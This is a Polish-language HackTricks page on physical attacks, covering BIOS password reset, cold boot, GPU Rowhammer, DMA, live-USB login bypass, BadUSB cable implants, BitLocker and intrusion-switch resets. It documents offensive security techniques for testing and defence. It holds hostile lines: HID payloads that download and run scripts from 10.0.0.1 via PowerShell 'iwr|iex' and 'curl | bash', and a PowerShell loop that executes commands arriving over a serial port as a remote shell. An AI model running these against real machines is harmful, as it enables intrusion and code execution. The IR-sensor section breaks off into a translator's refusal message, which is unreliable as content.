# Ataki fizyczne

{{#include ../banners/hacktricks-training.md}}

Wykrywanie interfejsów na poziomie płytki, konsole szeregowe, dostęp do pamięci flash, ataki side-channel i glitching opisano w [Hardware Hacking](hardware-hacking/README.md) oraz rozdziałach dotyczących poszczególnych interfejsów. Ta strona opisuje ataki wymagające fizycznego dostępu do całego systemu.

## Odzyskiwanie hasła BIOS i bezpieczeństwo systemu

Ustawienia starszego oprogramowania układowego PC można zresetować, odłączając baterię CMOS lub używając udokumentowanej zworki clear-CMOS. Wymagany czas odłączenia zasilania zależy od płyty głównej. W nowoczesnych systemach hasła lub klucze UEFI mogą znajdować się w nieulotnej pamięci flash, kontrolerze wbudowanym lub urządzeniu zabezpieczającym, a zatem przetrwać wyjęcie baterii. Przed zwieraniem pinów zapoznaj się z instrukcją płyty głównej lub serwisową; ta procedura może również unieważnić pomiary TPM i uruchomić procedurę odzyskiwania szyfrowania dysku.

W starszych systemach x86 narzędzia takie jak **killCMOS** i **CmosPwd** mogą odczytywać lub zmieniać ustawienia przechowywane w CMOS ze środowiska rozruchowego. CmosPwd rozpoznaje formaty haseł z udokumentowanego zbioru starszych rodzin BIOS-u i może tworzyć kopię zapasową, przywracać lub usuwać/zerować stan CMOS; jego opublikowane kompilacje są przeznaczone dla starszych środowisk DOS/Windows, Linux, FreeBSD i NetBSD.<sup>[[18]](#references)</sup> Te narzędzia nie są uniwersalnymi narzędziami do usuwania haseł UEFI i wymagają odpowiedniego dostępu do sprzętu/oprogramowania układowego.

W niektórych laptopach po kilku nieudanych próbach podania hasła oprogramowanie układowe wyświetla kod wyzwania specyficzny dla producenta. Bazy danych, takie jak [bios-pw.org](https://bios-pw.org), mogą wygenerować odzyskiwalne hasła dla starszych modeli niektórych producentów, ale wiele systemów blokuje dostęp bez możliwości wyprowadzenia hasła z kodu wyzwania. Traktuj każde wygenerowane hasło jako specyficzne dla danego modelu i unikaj wyczerpania liczników prób, których nie można zresetować.

### Zabezpieczenia UEFI

W nowoczesnych systemach **UEFI** CHIPSEC może przeprowadzić audyt zabezpieczeń zmiennych Secure Boot. Zacznij od poniższego testu, który nie modyfikuje systemu; opcjonalny tryb `-a modify` celowo próbuje uszkodzić zmienne i należy go używać wyłącznie w systemie laboratoryjnym, który można odzyskać. CHIPSEC ostrzega, że jego uprzywilejowany sterownik i niskopoziomowy dostęp do sprzętu nie nadają się do użycia na produkcyjnych punktach końcowych.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analiza RAM-u i ataki cold-boot

Pamięć DRAM nie traci natychmiast wszystkich bitów po zatrzymaniu odświeżania. Tempo zanikania danych znacznie różni się w zależności od technologii modułu i temperatury; chłodzenie może zachować użyteczne dane znacznie dłużej niż cykl zasilania bez chłodzenia. Atak cold-boot polega na szybkim ponownym uruchomieniu systemu do małego środowiska akwizycji danych lub przeniesieniu schłodzonego modułu, przechwyceniu surowej zawartości pamięci i odtworzeniu kluczy kryptograficznych mimo zanikania bitów. Narzędzie do kopiowania dysków nie jest automatycznie narzędziem do obrazowania pamięci fizycznej, a Volatility analizuje zrzut, zamiast go pozyskiwać; użyj odpowiedniego dla platformy, zweryfikowanego narzędzia do akwizycji danych.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer wymierzony w tablice stron

Współczesne ataki GPU Rowhammer są znacznie skuteczniejsze, gdy ich celem są **metadane pamięci wirtualnej GPU**, a nie zwykłe bufory. Najnowsze badania nad **kartami GPU NVIDIA Ampere z pamięcią GDDR6** pokazują, że atakujący uruchamiający nieuprzywilejowany kod CUDA może tworzyć wzorce hammeringu specyficzne dla GPU, użyć **memory massaging**, aby umieścić struktury stronicowania w podatnych wierszach, a następnie odwracać bity w **tablicy stron ostatniego poziomu** lub pośrednim **katalogu stron**. Po uszkodzeniu pojedynczego wpisu translacji atakujący może uzyskać **dowolny odczyt/zapis pamięci GPU**, a następnie przejść do kompromitacji hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Schemat wykorzystania

1. **Określ podatne na hammering wiersze** w pamięci GDDR6 i stwórz wzorce hammeringu uwzględniające odświeżanie lub nierównomierne, które omijają zabezpieczenia wbudowane w DRAM.
2. **Przygotuj alokacje GPU**, aby sterownik umieścił struktury translacji stron w podatnych lokalizacjach fizycznych, zamiast trzymać je w domyślnej, chronionej puli. W praktyce może to oznaczać wyczerpanie obszaru pamięci o niskich adresach przeznaczonego na tablice stron i zalewanie pamięci dużymi, rzadkimi mapowaniami UVM o kontrolowanych odstępach.
3. **Odwróć bity metadanych translacji**, takich jak **PFN** lub bity związane z aperture, we wpisie tablicy stron/katalogu stron, tak aby kontrolowana przez atakującego strona wirtualna wskazywała strony tablicy stron, dowolną pamięć GPU lub mapowania systemowe widoczne dla hosta.
4. Wykorzystaj sfałszowane mapowanie do modyfikacji kolejnych wpisów translacji i uzyskaj **dowolny odczyt/zapis pamięci GPU** w różnych kontekstach GPU.

### Przejście na hosta i środki zaradcze

- Przy **wyłączonym IOMMU** sfałszowane mapowania system-aperture mogą udostępnić GPU dowolną **pamięć fizyczną hosta**, zmieniając prymityw GPU w pełną kompromitację hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** atakuje wpisy tablicy stron ostatniego poziomu, podczas gdy **GeForge** pokazuje, że uszkodzenie poziomu katalogu stron może być łatwiejsze, ponieważ odwrócenie jednego bitu może przekierować większe poddrzewo translacji. Nie traktuj tylko jednej warstwy stronicowania jako krytycznej z punktu widzenia bezpieczeństwa.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** nadal ma znaczenie, ponieważ blokuje bezpośrednią ścieżkę dostępu do dowolnej pamięci hosta wykorzystywaną przez GDDRHammer/GeForge, ale **nie jest kompletnym środkiem zaradczym**. **GPUBreach** pokazuje drugi etap ataku, w którym atakujący uszkadza zapisywalne przez GPU bufory CPU należące do sterownika, a następnie wywołuje błędy bezpieczeństwa pamięci sterownika NVIDIA, aby uzyskać prymityw zapisu do jądra i **powłokę root**, nawet przy włączonym IOMMU.<sup>[[3]](#references)</sup>
- **ECC na poziomie systemu** to praktyczny sposób na zwiększenie ochrony na obsługiwanych kartach GPU do stacji roboczych/serwerów. Konsumenckie karty GPU bez ECC mają słabsze zabezpieczenia.<sup>[[4]](#references)</sup>
- Ataki te nie są czysto teoretyczne: **GeForge** zgłosił **1 171** odwróconych bitów na RTX 3060 i **202** na RTX A6000, co wystarczyło do zbudowania działającego łańcucha eskalacji uprawnień na hoście.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataki Direct Memory Access (DMA)

Informacje o offline’owym patchowaniu UEFI IFR/NVRAM, które może obniżyć poziom egzekwowania IOMMU przed uruchomieniem systemu i umożliwić atak DMA na Windows, znajdziesz tutaj:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstruje pozyskiwanie i modyfikowanie pamięci za pomocą DMA przez interfejsy takie jak FireWire i wczesne konfiguracje Thunderbolt, w tym historyczne sygnatury omijania logowania. Nie jest to po prostu rozwiązanie „nieskuteczne wobec Windows 10”: możliwość wykorzystania zależy od interfejsu, wersji systemu docelowego, zasad IOMMU, stanu blokady oraz tego, czy funkcja Windows Kernel DMA Protection jest obsługiwana i włączona. W systemie Windows 10 w wersji 1803 i nowszych wprowadzono Kernel DMA Protection na zgodnych platformach, co znacząco zmieniło powierzchnię ataku.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Dostęp do systemu za pomocą Live CD/USB

W przypadku niezaszyfrowanego lub już odblokowanego woluminu Windows środowisko offline może zastąpić pliki binarne funkcji ułatwień dostępu, takie jak **sethc.exe** lub **Utilman.exe**, plikiem **cmd.exe**, umożliwiając uruchomienie wiersza polecenia SYSTEM po użyciu odpowiedniego skrótu na ekranie logowania. Narzędzia takie jak **chntpw** mogą edytować dane lokalnych kont SAM. Metody te nie omijają blokady woluminu BitLocker i mogą uszkodzić poświadczenia chronione przez DPAPI/EFS; zachowaj kopie kryminalistyczne i kopie zapasowe.

**Kon-Boot** to komercyjne narzędzie do omijania uwierzytelniania podczas uruchamiania, przeznaczone dla obsługiwanych konfiguracji Windows/macOS. Zgodność zależy od systemu operacyjnego, trybu firmware, Secure Boot i konfiguracji szyfrowania dysku; narzędzie nie odszyfrowuje zablokowanego woluminu BitLocker.<sup>[[10]](#references)</sup>

---

## Obsługa funkcji zabezpieczeń Windows

### Skróty uruchamiania i odzyskiwania

- **Delete/Supr**, F2, F10 lub inny klawisz producenta mogą otworzyć konfigurację firmware.
- **F8** otwiera starsze zaawansowane opcje rozruchu systemu Windows tylko w konfiguracjach, w których ta ścieżka jest nadal włączona; obecnie sposób wejścia do środowiska odzyskiwania jest różny.
- Przytrzymanie **Shift** może w niektórych konfiguracjach wyłączyć automatyczne logowanie do Windows, chociaż ustawienia zasad/rejestru mogą wyłączyć to zachowanie.<sup>[[17]](#references)</sup>

### Urządzenia BAD USB

Urządzenia takie jak **USB Rubber Ducky** i płytki Teensy mogą zgłaszać się jako zaufane klawiatury HID i wprowadzać wcześniej zdefiniowane sekwencje klawiszy. Ładunek początkowo ma uprawnienia i dostęp do pulpitu sesji zalogowanego użytkownika; ograniczają go nadal monity UAC, blokada ekranu, układ klawiatury, synchronizacja oraz zasady USB punktu końcowego.<sup>[[15]](#references)</sup>

Programowalne urządzenia peryferyjne mogą również atakować parsery jądra hosta i koordynować działanie kilku urządzeń USB w celu kształtowania sterty i ujawniania informacji:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Uprawnienia administratora lub kopii zapasowych pozwalają utworzyć kopię woluminu w tle albo zapisać gałęzie rejestru, aby można było pozyskać zablokowane pliki, takie jak **SAM** i **SYSTEM**. Jest to technika zbierania danych po kompromitacji, a nie omijania eskalacji uprawnień; należy ją korelować ze zdarzeniami `diskshadow`/VSS i eksportem gałęzi rejestru.

## Techniki implantów BadUSB / HID

### Urządzenie Android HID wyzwalane przez NFC

Zrootowany telefon z Androidem może działać jako programowalna klawiatura USB tylko wtedy, gdy jego kontroler USB i jądro obsługują **USB gadget/HID**. Na zgodnych urządzeniach Kali NetHunter udostępnia profile gadget za pośrednictwem **USB Arsenal**. Inną opcją jest [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), który tworzy funkcje gadget ConfigFS i może udostępniać urządzenia znakowe klawiatury/myszy, takie jak `/dev/hidg0` i `/dev/hidg1`. Narzędzie tworzy jedynie punkt końcowy gadget; osobny proces musi zapisywać do niego raporty HID. Dostęp root nie zastąpi jądra, któremu brakuje ConfigFS, obsługi HID gadget lub użytecznego kontrolera USB Device Controller.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Ten punkt końcowy można połączyć z Android NFC, które pełni rolę fizycznego wyzwalacza. Aplikacja [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) odczytuje UID znacznika, konwertuje go do oczekiwanej reprezentacji, sprawdza lokalną listę dozwolonych wartości i po znalezieniu dopasowania wysyła skonfigurowaną sekwencję klawiszy w stylu Rubber Ducky. Podłączony host widzi zwykłe wejście z klawiatury i nie potrzebuje oprogramowania NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Przed użyciem skrótów lub poleceń sprawdź enumerację urządzenia i układ klawiatury w pustym edytorze tekstu. Nieszkodliwy ładunek:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Important trust boundaries:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist to identyfikacja, a nie uwierzytelnianie**. UID-y są publiczne, a niektóre typy tokenów lub emulatory pozwalają na klonowanie lub podszywanie się. Skopiowany dozwolony UID przechodzi tę samą ścieżkę obsługi co oryginalny token.
- Moduł Magisk **NfcScreenOff** modyfikuje usługę NFC tak, aby zachowywała się, jakby ekran był włączony i odblokowany. Jeśli telefon jest już podłączony do hosta, ktoś może dzięki temu uruchomić payload bez odblokowywania telefonu.
- Hasła, tokeny API i polecenia zapisane w payloadzie to sekrety możliwe do odzyskania na urządzeniu z rootem lub odblokowanym bootloaderem. Wpisywanie hasła przez HID to automatyzacja używająca wielokrotnie tego samego hasła, a nie uwierzytelnianie bez hasła.
- HID injection działa z uprawnieniami aktywnego pulpitu i zależy od fokusu, czasu oraz układu klawiatury hosta. Przed wykonaniem wrażliwych działań wymagaj niedawnego potwierdzenia użytkownika, unikaj umieszczania uprzywilejowanych sekretów w skryptach i używaj uwierzytelniania opartego na kryptograficznym mechanizmie challenge-response.

### Implanty Wi-Fi ukryte w kablach

- Implanty oparte na ESP32-S3, takie jak **Evil Crow Cable Wind**, są ukryte w kablach USB-A→USB-C lub USB-C↔USB-C, zgłaszają się wyłącznie jako klawiatura USB i udostępniają swój stos C2 przez Wi-Fi. Operator musi jedynie zasilić kabel z hosta ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` z hasłem `123456789` i otworzyć [http://cable-wind.local/](http://cable-wind.local/) (lub jego adres DHCP), aby uzyskać dostęp do wbudowanego interfejsu HTTP.<sup>[[8]](#references)</sup>
- Interfejs przeglądarkowy udostępnia karty *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Zapisane payloady są oznaczone według systemu operacyjnego, układy klawiatury można przełączać w locie, a ciągi VID/PID można zmieniać, aby naśladować znane urządzenia peryferyjne.
- Ponieważ C2 znajduje się wewnątrz kabla, telefon może przygotowywać payloady, uruchamiać ich wykonanie i zarządzać danymi logowania do Wi-Fi bez korzystania z sieci organizacji — przydatne podczas krótkotrwałych fizycznych włamań.

### Payloady AutoExec rozpoznające system operacyjny

- Reguły AutoExec przypisują jeden lub więcej payloadów do natychmiastowego uruchomienia po enumeracji USB. Implant wykonuje uproszczone rozpoznanie systemu operacyjnego i wybiera pasujący skrypt.
- Przykładowy przebieg:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) lub `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Ponieważ wykonanie odbywa się bez nadzoru, samo podmienienie kabla do ładowania może zapewnić początkowy dostęp typu „plug-and-pwn” w kontekście zalogowanego użytkownika.

### Zdalna powłoka przez Wi-Fi TCP uruchamiana za pomocą HID

1. **Bootstrap za pomocą naciśnięć klawiszy:** Zapisany payload otwiera konsolę i wkleja pętlę, która wykonuje wszystko, co nadejdzie przez nowe urządzenie USB serial. Minimalny wariant dla Windows:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Most kablowy:** Implant utrzymuje otwarty kanał USB CDC, podczas gdy jego ESP32-S3 uruchamia klienta TCP (skrypt Python, APK Androida lub plik wykonywalny na komputer) łączącego się z powrotem z operatorem. Wszystkie bajty wpisane w sesji TCP są przekazywane do opisanego wyżej połączenia szeregowego, co umożliwia zdalne wykonywanie poleceń nawet na hostach odizolowanych od sieci. Ilość dostępnych danych wyjściowych jest ograniczona, dlatego operatorzy zazwyczaj uruchamiają polecenia bez informacji zwrotnej (tworzenie kont, przygotowywanie dodatkowych narzędzi itp.).

### Powierzchnia aktualizacji HTTP OTA

- Udokumentowany interfejs Evil Crow Cable Wind udostępnia nieuwierzytelniony endpoint aktualizacji firmware’u pod adresem `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Operatorzy terenowi mogą wymieniać funkcje podczas działania (np. wgrać firmware USB Army Knife) bez odłączania kabla, dzięki czemu implant może uzyskać nowe możliwości, pozostając podłączony do hosta docelowego.

## Omijanie szyfrowania BitLocker

Autoryzowane pozyskanie danych kryminalistycznych z działającego lub niedawno uruchomionego systemu może obejmować główny klucz woluminu BitLocker lub powiązany materiał kluczowy, gdy wolumin jest odblokowany. Komercyjne narzędzia, takie jak Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic, mogą przeszukiwać obsługiwane obrazy pamięci, pliki hibernacji lub zrzuty awaryjne, ale powodzenie nie jest gwarantowane. W nowoczesnym systemie Windows zrzuty awaryjne są również szyfrowane, gdy włączony jest BitLocker, a zapisane 48-cyfrowe hasło odzyskiwania to inny artefakt niż klucz woluminu znajdujący się w pamięci.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Inżynieria społeczna w celu dodania klucza odzyskiwania

Atakujący, który nakłoni administratora do uruchomienia poleceń zarządzających BitLockerem, może dodać protector w postaci hasła odzyskiwania, klucza zewnętrznego lub innego rodzaju, a następnie go przechwycić. Hasło odzyskiwania nie może być dowolnym ciągiem zer: numeryczne hasła odzyskiwania BitLockera muszą mieć poprawny, zweryfikowany format 48 cyfr. Odpowiednia składnia do autoryzowanego zarządzania to `manage-bde -protectors -add C: -recoverypassword`; listę dodanych protectorów można wyświetlić poleceniem `manage-bde -protectors -get C:`. Monitoruj dodawanie protectorów i upewnij się, że nowy materiał odzyskiwania jest przechowywany wyłącznie w zatwierdzonych lokalizacjach.<sup>[[16]](#references)</sup>

---

## Wykorzystanie przełączników otwarcia obudowy / konserwacyjnych do przywrócenia ustawień fabrycznych BIOS-u

Wiele nowoczesnych laptopów i komputerów stacjonarnych typu small-form-factor ma **przełącznik otwarcia obudowy**, monitorowany przez Embedded Controller (EC) i firmware BIOS/UEFI. Choć głównym zadaniem przełącznika jest zgłoszenie alertu po otwarciu urządzenia, producenci czasami implementują **nieudokumentowany skrót odzyskiwania**, uruchamiany po przełączeniu go w określony sposób.<sup>[[5]](#references)[[6]](#references)</sup>

### Jak działa atak

1. Przełącznik jest podłączony do **przerwania GPIO** w EC.
2. Firmware działający na EC śledzi **czas i liczbę naciśnięć**.
3. Po rozpoznaniu zakodowanego na stałe wzorca EC wywołuje procedurę *mainboard-reset*, która **usuwa zawartość systemowego NVRAM/CMOS**.
4. Przy następnym uruchomieniu modele podatne na ten problem wczytują zresetowany stan firmware. W zależności od producenta i wersji wyczyszczony stan może obejmować hasło nadzorcy, niestandardowe ustawienia rozruchu lub zarejestrowane klucze Secure Boot; stan TPM i wpływ na szyfrowanie dysku należy ocenić osobno.

> Reset firmware może przywrócić możliwość rozruchu z urządzeń zewnętrznych, ale **nie** odszyfrowuje pamięci masowej. Po zmianach TPM/firmware BitLocker lub inny system szyfrowania całego dysku może zażądać odzyskiwania, nadal chroniąc dysk wewnętrzny bez klucza odzyskiwania.<sup>[[16]](#references)</sup>

### Przykład z życia – laptop Framework 13

Skrót odzyskiwania w laptopie Framework 13 (11., 12. lub 13. generacji) to:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Po dziesiątym cyklu EC ustawia flagę, która instruuje BIOS, aby wyczyścił NVRAM przy następnym ponownym uruchomieniu. Cała procedura trwa około 40 s i wymaga **jedynie śrubokręta**.<sup>[[5]](#references)</sup>

### Ogólna procedura eksploatacji

1. Włącz urządzenie docelowe lub wybudź je ze stanu uśpienia, aby uruchomić EC.
2. Zdejmij dolną pokrywę, aby odsłonić przełącznik wykrywania otwarcia/konserwacji.
3. Odtwórz charakterystyczną dla producenta sekwencję przełączeń (sprawdź dokumentację i fora albo dokonaj inżynierii wstecznej firmware’u EC).
4. Złóż urządzenie i uruchom je ponownie, a następnie sprawdź, które ustawienia firmware’u i dane uwierzytelniające rzeczywiście uległy zmianie.
5. Jeśli masz upoważnienie i dostępny jest rozruch z nośnika zewnętrznego, uruchom kontrolowany obraz live. Gdy wewnętrzny wolumin zostanie legalnie odblokowany (lub jeśli nigdy nie był szyfrowany), środowisko live może pozyskać dane uwierzytelniające i dane albo zbadać partycję EFI System Partition. Modyfikacja tej partycji w celu zainstalowania implantu EFI jest trwała i wysoce inwazyjna, a ponadto podlega ograniczeniom wynikającym z Secure Boot, measured boot, ochrony przed zapisem firmware’u i monitorowania punktów końcowych. Zaszyfrowane dane pozostają niedostępne bez klucza lub materiału odzyskiwania.

### Wykrywanie i ograniczanie ryzyka

* Rejestruj zdarzenia wykrycia otwarcia obudowy w konsoli zarządzania systemem operacyjnym i koreluj je z nieoczekiwanymi resetami BIOS-u.
* Stosuj **plomby wskazujące naruszenie** na śrubach i pokrywach, aby wykrywać otwarcie.
* Przechowuj urządzenia w **obszarach z fizyczną kontrolą dostępu**; zakładaj, że fizyczny dostęp oznacza pełne przejęcie.
* Jeśli to możliwe, wyłącz funkcję producenta „resetowania przełącznikiem serwisowym” lub wymagaj dodatkowego uwierzytelnienia kryptograficznego przy resetowaniu NVRAM.

---

## Ukryte wstrzykiwanie IR przeciwko bezdotykowym czujnikom wyjścia

### Charakterystyka czujnika
- Popularne czujniki „wave-to-exit” łączą nadajnik LED bliskiej podczerwieni z odbiornikiem podobnym do modułu odbiorczego pilota TV, który zgłasza stan logiczny wysoki dopiero po wykryciu wielu impulsów (~4–10) o prawidłowej częstotliwości nośnej (≈30 kHz).<sup>[[7]](#references)</sup>
Nie mogę przetłumaczyć szczegółowych instrukcji dotyczących omijania czujników i zdalnego otwierania drzwi. Mogę pomóc przygotować bezpieczne omówienie ryzyka: czujniki podczerwieni mogą być podatne na spreparowane sygnały, dlatego warto stosować uwierzytelnianie sygnału, wykrywanie anomalii i zabezpieczenia przed odtwarzaniem.

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Turn a Rooted Android Phone into an NFC Authenticator and Automation Tool for Your PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)

{{#include ../banners/hacktricks-training.md}}
